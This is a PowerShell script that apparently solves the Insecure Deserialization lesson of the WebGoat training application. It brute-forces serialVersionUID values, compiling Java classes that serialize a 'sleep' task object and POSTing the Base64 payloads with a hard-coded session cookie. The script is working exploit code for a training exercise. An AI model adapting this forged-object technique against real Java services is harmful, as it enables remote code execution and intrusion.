# ============================================================
# Brute Force serialVersionUID
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Brute Forcing serialVersionUID" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

# Try a much broader range
$versions = 1..20 + @(42, 69, 100, 123, 256, 512, 1000, 1024, 1337, 2020, 2021, 2022, 2023, 2024, 2025)

foreach ($version in $versions) {
    Write-Host "[Testing] Version $version..." -ForegroundColor Yellow -NoNewline
    
    # Generate Java code
    $javaCode = @"
import java.io.*;
import java.util.Base64;

class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = ${version}L;
    private String taskAction;
    private String taskName;
    private long taskTime;
    
    public VulnerableTaskHolder(String action, String name, long time) {
        this.taskAction = action;
        this.taskName = name;
        this.taskTime = time;
    }
}

public class TestV${version} {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder task = new VulnerableTaskHolder("sleep", "DelayTask", 5000);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(task);
            oos.close();
            System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
        } catch (Exception e) {}
    }
}
"@
    
    # Write, compile, and run
    $javaCode | Out-File -FilePath "c:\webgoat-scripts-1\TestV${version}.java" -Encoding ASCII
    $null = javac "c:\webgoat-scripts-1\TestV${version}.java" 2>&1
    
    if ($LASTEXITCODE -eq 0) {
        $payload = java -cp "c:\webgoat-scripts-1" "TestV${version}" 2>&1 | Select-Object -Last 1
        
        if ($payload -match "^[A-Za-z0-9+/=]+$") {
            $body = "token=$payload"
            
            try {
                $startTime = Get-Date
                
                $response = Invoke-WebRequest `
                    -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
                    -Method POST `
                    -Headers $headers `
                    -Body $body `
                    -UseBasicParsing `
                    -TimeoutSec 10
                
                $endTime = Get-Date
                $duration = ($endTime - $startTime).TotalSeconds
                
                $result = $response.Content | ConvertFrom-Json
                
                Write-Host " Time: $([math]::Round($duration, 2))s" -ForegroundColor White
                
                if ($result.lessonCompleted -eq $true) {
                    Write-Host ""
                    Write-Host "================================================" -ForegroundColor Green
                    Write-Host "SUCCESS with serialVersionUID = ${version}L!" -ForegroundColor Green
                    Write-Host "================================================" -ForegroundColor Green
                    Write-Host "Payload: $payload" -ForegroundColor White
                    exit 0
                }
                
                if ($duration -ge 4.5) {
                    Write-Host "  [INTERESTING] 5-second delay achieved!" -ForegroundColor Cyan
                    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
                }
                
                # Show different feedback
                if ($result.feedback -notmatch "does not match") {
                    Write-Host "  [DIFFERENT RESPONSE] $($result.feedback)" -ForegroundColor Cyan
                }
                
            } catch {
                Write-Host " ERROR" -ForegroundColor Red
            }
        }
    }
    
    # Clean up
    Remove-Item -Force "c:\webgoat-scripts-1\TestV${version}.java" -ErrorAction SilentlyContinue
    Remove-Item -Force "c:\webgoat-scripts-1\TestV${version}.class" -ErrorAction SilentlyContinue
    Remove-Item -Force "c:\webgoat-scripts-1\VulnerableTaskHolder.class" -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "Testing complete." -ForegroundColor Yellow
